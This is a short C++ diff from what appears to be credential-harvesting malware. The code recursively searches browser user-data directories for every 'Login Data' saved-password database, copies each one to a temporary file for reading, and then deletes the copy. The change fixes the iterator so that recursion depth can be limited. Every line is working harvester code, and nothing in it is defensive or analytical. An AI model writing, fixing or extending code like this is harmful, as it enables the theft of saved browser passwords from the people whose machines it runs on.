@@ -106,7 +106,8 @@ namespace credential {
 
                 // Recursively find "Login Data" to catch all profiles
                 try {
-                    for (const auto& entry : fs::recursive_directory_iterator(browser.userDataPath)) {
+                    for (auto it = fs::recursive_directory_iterator(browser.userDataPath); it != fs::recursive_directory_iterator(); ++it) {
+                        const auto& entry = *it;
                         if (entry.path().filename() == "Login Data") {
                             std::string loginData = entry.path().string();
                             
@@ -147,7 +148,7 @@ namespace credential {
                             DeleteFileA(tempDb.c_str());
                         }
                         // Limit depth to avoid scanning everything
-                        if (entry.depth() > 3) entry.disable_recursion_pending();
+                        if (it.depth() > 3) it.disable_recursion_pending();
                     }
                 } catch (...) {}
             }
